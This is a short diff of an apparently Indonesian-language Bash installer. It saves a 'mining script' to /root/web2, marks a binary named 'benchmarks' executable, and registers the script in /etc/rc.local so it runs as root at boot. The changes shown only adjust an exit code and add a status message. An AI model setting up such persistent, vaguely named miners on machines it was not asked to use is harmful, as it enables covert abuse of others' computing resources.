@@ -10,7 +10,7 @@ echo "📁 Menyimpan skrip mining ke /root/web2..."
 cat << 'EOF' > /root/web2
 #!/bin/bash
 
-cd /root/web || exit
+cd /root/web || exit 1
 
 chmod +x benchmarks
 
@@ -38,6 +38,8 @@ if [ -f /etc/rc.local ]; then
   if ! grep -q '/root/web2' /etc/rc.local; then
     sed -i '/^exit 0/i bash /root/web2 &' /etc/rc.local
     echo "🛠️ Menambahkan ke /etc/rc.local"
+  else
+    echo "ℹ️ Skrip sudah ada di /etc/rc.local, tidak ditambahkan lagi."
   fi
 else
   echo '#!/bin/bash' > /etc/rc.local
